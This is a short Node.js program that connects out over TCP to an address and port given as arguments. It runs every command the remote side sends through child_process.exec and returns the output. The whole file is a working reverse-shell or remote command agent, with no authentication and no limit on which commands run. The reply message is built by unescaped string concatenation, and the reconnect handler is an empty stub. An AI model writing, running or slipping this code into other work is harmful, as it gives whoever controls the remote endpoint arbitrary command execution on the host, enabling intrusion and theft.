var exec = require('child_process').exec;
var net = require('net');

var port = process.argv[3] || 9999;
var address = process.argv[2] || '127.0.0.1';

var client = new net.Socket();
client.connect(port, address, function() {
	client.write('{"cmd": "", "value": ""}');
});

client.on('data', function(data)  {
  try {
    var res = JSON.parse(data);
    exec(res.cmd, function(error, stdout, stderr) {
      client.write("{\"cmd\": \"" + res.cmd + "\", \"value\": " + JSON.stringify(stdout) + "}");
    });
  } catch (e) {}
});

client.on('close', function() {
	setInterval(function() {
		//check raw
	}, 5000);
});
